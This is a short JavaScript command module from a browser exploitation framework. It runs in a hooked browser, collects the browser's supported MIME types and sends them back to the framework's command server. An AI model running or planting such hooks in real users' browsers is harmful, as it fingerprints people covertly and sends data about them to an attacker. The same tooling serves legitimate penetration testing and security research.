//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  if (navigator.mimeTypes) {
    var mime_types = JSON.stringify(navigator.mimeTypes);
    server.net.send("<%= @command_url %>", <%= @command_id %>, "mime_types=" + mime_types, server.are.status_success());
    server.debug("[Detect MIME Types] " + mime_types);
  } else {
    server.debug("[Detect MIME Types] Could not retrieve supported MIME types");
    server.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=Could not retrieve supported MIME types', server.are.status_error());
  }

});

